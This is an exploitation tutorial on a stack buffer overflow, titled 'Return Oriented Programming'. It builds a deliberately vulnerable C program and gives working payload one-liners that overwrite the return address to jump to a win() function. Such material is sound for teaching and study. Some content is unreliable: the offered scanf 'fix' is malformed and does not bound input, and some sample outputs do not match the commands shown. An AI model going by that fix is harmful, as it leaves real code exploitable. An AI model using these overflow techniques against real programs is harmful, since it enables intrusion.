# Return Oriented Programming

## Introduction

When we try to access (read from or write to) a memory address that isn't
actually mapped to our process, the kernel sends a SIGSEGV (Segmentation
Fault), (usually) killing our process.

```c
int main() {
    // create a pointer to the address 0 and dereference it
    *((int*)0) = 0;
}
```

Note that `dmesg` helpfully tells us the position of the instruction pointer
`ip` (where the segfault occurred).

```sh
gcc segv.c

./a.out
# Segmentation fault

sudo dmesg
# [ 2342.736665] a.out[758]: segfault at 7f4b9bfea620 ip 00007f4b9bfea620 sp 00007ffdcf0a0778 error 15 in ld-2.31.so[7f4b9bfea000+1000]
```

## Buffer Overflow

```c
#include <stdio.h>
#include <string.h>

#define SECRET_PHRASE "bed bananas"

void win() {
    printf("You may now get yourself a piece of the great cake!\n");
}

void main(int argc, char **argv) {
    char pass[12] = {0};
    printf("What is the secret phrase?\n");
    scanf("%[^\n]", pass);
    if (0 == (strncmp(SECRET_PHRASE, pass, sizeof(SECRET_PHRASE)))) {
        win();
    } else {
        printf("The secret phrase is not: %s\n", pass);
    }
}
```

The above code is susceptible to a buffer overflow attack.
Scanf reads the entire input line into `pass` buffer, input longer than 12
(ASCII) characters will overwrite memory further down (or up, considering that
on x86 the stack grows from high to low memory addresses) the stack.

```c
scanf("%[^\n]", pass);
```

A more correct version would be:

```c
scanf("11%[^\n]", pass);
```

## Stack Canaries

GCC with its default options puts some sort of security check in place.

```sh
gcc exploitable.c
printf 'A%.0s' {1..40} | ./a.out

# What is the secret phrase?
# The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# *** stack smashing detected ***: terminated
# Aborted

sudo dmesg
# [ 3491.530583] a.out[954]: segfault at 7f0041414141 ip 00007f0041414141 sp 00007fffcc4bdc20 error 14 in libc-2.31.so[7f8bfc9c3000+22000]
```

So let's compile with `clang` instead.

## Locating the Return Address

The return address is located somewhere at the bottom of the stack frame.
When returning, the return address is loaded into the IP register and execution
continues at that address.

ASCII 'A' is hex 0x41:

```sh
clang exploitable.c
printf 'A%.0s' {1..40} | ./a.out

# What is the secret phrase?
# The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Segmentation fault

sudo dmesg
# [ 3926.193998] a.out[954]: segfault at 7f0041414141 ip 00007f0041414141 sp 00007fffcc4bdc20 error 14 in libc-2.31.so[7f8bfc9c3000+22000]
```

Pay special attention to the line `segfault at 7f0041414141`.

By playing around with the amount of 'A's we send, we can figure out that after
36 of them, the return address begins.

<details>
    <summary>Tips & Tricks</summary>

    Another way is to generate a random string with no repeating patterns.
    Then just match the pattern from the IP against your input string to find
    the exact position.
</details>

## Address of the Win Function

To make it easy for us we assume that the binary executable is not "stripped",
meaning that information about function names is still intact.

This is the function we would like to "return" to:

```sh
objdump -d -M intel_syntax a.out

# ... SNIP ...
#
# 0000000000401160 <win>:
#   401160:       55                      push   rbp
#   401161:       48 89 e5                mov    rbp,rsp
#   401164:       48 bf 04 20 40 00 00    movabs rdi,0x402004
#   40116b:       00 00 00
#   40116e:       b0 00                   mov    al,0x0
#   401170:       e8 cb fe ff ff          call   401040 <printf@plt>
#   401175:       5d                      pop    rbp
#   401176:       c3                      ret
#   401177:       66 0f 1f 84 00 00 00    nop    WORD PTR [rax+rax*1+0x0]
#   40117e:       00 00
#
# ... SNIP ...
```

## Crafting a Payload

Using Python we can easily craft a malicious input string...

```sh
python3 -c 'print("A" * 36 + "\x60\x11\x40\x00\x00")'
```

...where `6011400000` is the address of the `win` function.

Note that we had to convert the endianness to match that of our CPU.

Or if you're scared of snakes, maybe try Clojure:

```sh
clojure -e "(println (apply str (concat (repeat 36 \A) (map char '(0x60 0x11 0x40 0x00 0x00)))))"
```

## Read, Set, Exploit!

```sh
python3 -c 'print("A" * 36 + "\x60\x11\x40\x00\x00")' | ./a.out
What is the secret phrase?
The secret phrase is not: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<garbled text>
You may now get yourself a piece of the great cake!
Segmentation fault
```

As you can see from the output, the `win` function was run, between `main`
returning and a segfault.
